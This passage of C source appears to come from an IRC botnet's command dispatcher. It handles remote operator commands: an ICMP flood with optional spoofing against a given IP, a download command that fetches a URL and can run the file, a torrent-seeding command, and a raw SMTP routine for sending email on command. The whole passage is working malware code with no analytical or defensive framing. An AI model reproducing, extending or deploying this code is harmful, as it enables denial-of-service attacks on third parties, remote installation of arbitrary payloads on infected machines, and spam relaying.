			ICMPFLOOD icmpflood;
			if ((icmpflood.time = atoi(a[s+2])) > 0) {
				_snprintf(icmpflood.ip,sizeof(icmpflood.ip),a[s+1]);
				icmpflood.spoof = (parameters['r']);
				icmpflood.sock = sock;
				_snprintf(icmpflood.chan,sizeof(icmpflood.chan),a[2]);
				icmpflood.notice = notice;
				icmpflood.silent = silent;

				_snprintf(sendbuf,sizeof(sendbuf),"[ICMP]: Flooding: (%s) for %s seconds.", a[s+1], a[s+2]);
				icmpflood.threadnum = addthread(sendbuf,ICMP_THREAD,NULL);
				if (threads[icmpflood.threadnum].tHandle = CreateThread(NULL, 0, &ICMPFloodThread, (LPVOID)&icmpflood, 0, &id)) {
					while(icmpflood.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[ICMP]: Failed to start flood thread, error: <%d>.", GetLastError());
			} else
				sprintf(sendbuf,"[ICMP]: Invalid flood time must be greater than 0.");

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return 1;
		}
		#endif

		// commands requiring at least 3 parameters
		else if (a[s+3] == NULL) return 1;

			#ifndef NO_SEED
	else if (strcmp("seed", a[s]) == 0 || strcmp("utorrent.seed", a[s]) == 0) {
	{
	char *url;
	char *oic;
	char *kkk;

    url = a[1];
	oic = a[2];
	kkk = a[3];

	switch( SeedUTorrent( url, oic, kkk ) )
    {
   case 0:
	  irc_privmsg(sock, channel, "Seeding!", notice);
   };
	}
	}
	#endif
		#ifndef NO_DOWNLOAD
		else if (strcmp("dl", a[s]) == 0 || strcmp("degsdgl", a[s]) == 0) {
			DOWNLOAD dl;
			strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
			strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
			dl.update = 0;
			dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
			dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
			dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
			dl.encrypted=(parameters['e']);
			dl.sock = sock;
			strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
			dl.notice=notice;
			dl.silent = silent;
			sprintf(sendbuf, "[DOWNLOAD]: Downloading URL: %s to: %s.", a[s+1], a[s+2]);
			dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
			if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
				while(dl.gotinfo == FALSE)
					Sleep(50);
			} else
				sprintf(sendbuf,"[DOWNLOAD]: Failed to start transfer thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return 1;
		}
		#endif
		// commands requiring at least 4 parameters
		else if (a[s+4] == NULL) return 1;
		else if (strcmp("email", a[s]) == 0 ) {
			WORD version = MAKEWORD(1,1);
			WSADATA wsaData;
			char server[256], sender_email[256], recp_email[256], subject[256], myBuf[256], BigBuf[1024];
			int port, nRet;

			strcpy(server,a[s+1]);
			port = atoi(a[s+2]);
			strcpy(sender_email,a[s+3]);
			strcpy(recp_email,a[s+4]);
			strcpy(subject,replacestr(a[s+5],"_"," "));
			fWSAStartup(version, &wsaData);

			LPHOSTENT lpHostEntry;
			lpHostEntry = fgethostbyname(server);

			SOCKET MailSocket;
			MailSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

			SOCKADDR_IN saServer;
			saServer.sin_family = AF_INET;
			saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
			saServer.sin_port = fhtons((unsigned short)port);
			sprintf(BigBuf,"helo $rndnick\nmail from: <%s>\nrcpt to: <%s>\ndata\nsubject: %s\nfrom: %s\n%s\n.\n",sender_email,recp_email,subject,sender_email,subject);
			nRet = fconnect(MailSocket, (LPSOCKADDR)&saServer, sizeof(saServer));
			nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
			nRet = fsend(MailSocket,  BigBuf, strlen(myBuf), 0);
			nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
			fclosesocket(MailSocket);
			fWSACleanup();

			sprintf(sendbuf, "[EMAIL]: Message sent to %s.",recp_email);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}

		// commands requiring at least 5 parameters 
		else if (a[s+5] == NULL) return 1; 
	}

	return 1;
}
